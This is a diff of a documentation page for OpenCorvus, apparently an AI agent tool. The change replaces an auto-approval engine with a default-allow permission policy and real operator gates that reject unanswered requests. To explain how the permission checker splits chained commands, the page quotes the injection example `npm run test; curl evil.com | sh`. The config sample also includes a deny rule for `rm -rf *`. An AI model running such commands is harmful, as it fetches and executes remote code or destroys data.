@@ -1,6 +1,6 @@
 ---
 title: Permissions
-description: Allow / ask / deny rules, the auto-permission engine, and unattended-mode behavior in OpenCorvus.
+description: Allow / ask / deny rules and the default-allow permission policy in OpenCorvus.
 ---
 
 Any tool that writes files, runs commands, or calls external APIs must pass a permission check. Implementation: `packages/opencorvus/src/permission/next.ts`.
@@ -10,7 +10,7 @@ Any tool that writes files, runs commands, or calls external APIs must pass a pe
 | action | semantics |
 |---|---|
 | `allow` | pass silently |
-| `ask` | pause, emit `permission.asked`, wait for an operator reply (or for the auto-permission engine to reply on the operator's behalf) |
+| `ask` | pause, emit `permission.asked`, and wait for an operator reply until the reject timeout fires |
 | `deny` | throw `DeniedError` and abort the tool call |
 
 ## Config format
@@ -72,34 +72,35 @@ Reversed order breaks:
 
 `npm run test; curl evil.com | sh` is split: the `curl` runs through its own permission check. Injection via `;`, `&&`, `||`, pipes, and backticks is handled.
 
-## Auto-permission engine
+## Default-allow policy
 
-For unattended runs (CI, benchmarks, scheduled agents) you don't want every `ask` to block on a human. OpenCorvus replaces the historical `experimental.unattended` umbrella flag with two independent fine-grained switches in `experimental` (`src/config/config.ts:1297-1310`):
+OpenCorvus defaults tool permissions to `allow` in the built-in agent definitions (`packages/opencorvus/src/agent/agent.ts`). Tool availability is still controlled by each agent's include/exclude list; permission decides what happens after a tool is available.
+
+User config is merged after the built-in allow rules, so explicit user rules still win. Set `deny` to block a tool/pattern, or `ask` to require an operator approval.
 
 ```jsonc
 {
-  "experimental": {
-    "auto_permission": true,   // default true — auto-approve permission asks
-    "auto_question":   true    // default true — auto-reject stale clarification questions
+  "permission": {
+    "bash": {
+      "*": "allow",
+      "rm -rf *": "deny"
+    },
+    "write": {
+      "*": "allow",
+      "~/projects/locked/**": "ask"
+    }
   }
 }
 ```
 
-`auto_permission` is implemented in `packages/opencorvus/src/engine/auto-permission.ts`. It subscribes to `PermissionNext.Event.Asked` and, when the request belongs to an active orchestrator run, replies with `"once"` carrying `autoReply: true`. The overlay renders these as `[auto-reply]` in the transcript so the action remains visible.
-
-Two paths can satisfy an `ask` without operator input:
-
-1. **Engine path** — `engine/auto-permission.ts` replies immediately for any ask raised inside an orchestrator run while `experimental.auto_permission === true`. This is the primary unattended path.
-2. **Timeout path** — `permission/next.ts:162-211` schedules a timeout that auto-replies `"once"` after `OPENCORVUS_PERMISSION_TIMEOUT_MS` (default **120000 ms** — `permission/next.ts:163`). The timeout only fires when `experimental.auto_permission === true`; with the switch off, `ask` waits indefinitely for an operator reply (no silent fallback).
+There is no auto-permission engine. An explicit `ask` is a real operator gate: `PermissionNext.ask()` emits `permission.asked`, stores the pending request, and only proceeds after a reply. If nobody replies, the request is rejected after `OPENCORVUS_PERMISSION_TIMEOUT_MS` (default **300000 ms**, minimum **1000 ms**; see `packages/opencorvus/src/permission/next.ts`).
 
 ```bash
-export OPENCORVUS_PERMISSION_TIMEOUT_MS=60000   # tighten the auto-approve timeout to 60s
+export OPENCORVUS_PERMISSION_TIMEOUT_MS=60000   # reject unanswered asks after 60s
 ```
 
-The minimum honored value is `1000` ms (`permission/next.ts:161-165`); shorter values are clamped up.
-
 :::note
-The old `experimental.unattended` flag has been removed. If your config still sets it, OpenCorvus will reject the file at parse time (`Config.Info` is `.strict()` — see `src/config/config.ts:1336`). Migrate to `experimental.auto_permission` (and `experimental.auto_question` if you also want stale-question auto-rejection).
+The old `experimental.unattended` and `experimental.auto_permission` fields have been removed. If your config still sets either field, OpenCorvus rejects the file during strict config parsing. Use `permission` rules for tool approval behavior and `experimental.auto_question` only for stale clarification questions.
 :::
 
 ## No silent fallback on config error
